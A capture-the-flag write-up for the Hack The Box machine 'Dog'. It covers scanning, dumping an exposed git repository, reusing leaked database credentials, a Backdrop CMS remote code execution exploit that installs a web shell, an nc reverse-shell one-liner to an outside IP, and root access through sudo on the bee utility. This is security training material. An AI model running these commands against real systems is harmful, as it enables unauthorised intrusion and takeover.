---
name: Dog
difficulty: easy
os: linux
platform: htb

img: https://labs.hackthebox.com/storage/avatars/426830ea2ae4f05f7892ad89195f8276.png
---

## Enumeration

### Port Scan

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.58 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80 -sCV 10.10.11.58 -o targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 972ad22c898ad3ed4dac00d21e8749a7 (RSA)
|   256 277c3ceb0f26e962590f0fb138c9ae2b (ECDSA)
|_  256 9388474c69af7216094cba771e3b3beb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see, there is a web service running on port 80. This is exposing .git directory, which is a common misconfiguration in web applications. We can use this to our advantage.

We use `git-dumper` to download the contents of the `.git` directory:

```bash
python git_dumper.py http://10.10.11.58/.git/ ./website
```
## User Exploitation

This way we can download the entire repository, including the source code and configuration files.

We find a file named `settings.php` that contains sensitive information such as database credentials and other configuration details.
```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
```

Connecting to the database using the credentials we found, we can dump the users table to find valid user accounts.

```bash
mysql -u root -pBackDropJ2024DS2024 -h

Searching in depth, we find a possible user mail:
```bash
cat files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
```
The user is `tiffany@dog.htb`

Web page login was successfull using `tiffany@dog.htb:BackDropJ2024DS2024`

We can look up for exploits for the current version of Backdrop CMS. We find `https://www.exploit-db.com/exploits/52021` which is a Remote Code Execution (RCE) vulnerability in Backdrop CMS 1.27.1. Exactly the version we are running.

We copy and run the python script
```bash
python pya.py http://10.10.11.58
```
```
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

We need to transform .zip to .tar.gz to upload it in the web application. We can do this with the following command:
```bash
unzip shell.zip && tar -czvf shell.tar.gz shell
```

We upload the `shell.tar.gz` file to the web application using the following steps:
Functionality > Install Module > Manual Installation

Then we can execute commands using the web shell at `http://10.10.11.58//modules/shell/shell.php?cmd=whoami`
```bash
www-data
```

We can get a reverse shell using the following command:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.69 4444 > /tmp/f
```

Once we have a reverse shell, we can get a persistent shell by using the following commands on the reverse shell

```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

We move to user su `johncusack` using the known password `BackDropJ2024DS2024`
```bash
ssh johncusack
```

We can find the user flag in the home directory:
```bash
cat /home/johncusack/user.txt
```
```
user flag value
```

## Root Exploitation

We can check if user `johncusack` has sudo privileges:
```bash
sudo -l
```
```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```
We can see that user `johncusack` can run the command `/usr/local/bin/bee` as root.

We can check the usage of the `/usr/local/bin/bee` utility:
```bash
/usr/local/bin/bee --help
```

We find some interesting options

- eval: allows us to execute arbitrary php code
- --root: specifies the root directory to use

We can execute arbitrary code using these parameters. We can use the following command to get a reverse shell as root:
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("id");'
```
```
uid=0(root) gid=0(root) groups=0(root)
```

We can read the root flag:
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cat /root/root.txt");'
```
```
root flag value
```

## Conclusion
This walkthrough demonstrates how to exploit a vulnerable Backdrop CMS installation to gain user and root access on the Dog machine. By leveraging misconfigurations and known vulnerabilities, we were able to escalate privileges and retrieve the flags.
This highlights the importance of secure coding practices and proper configuration management in web applications.

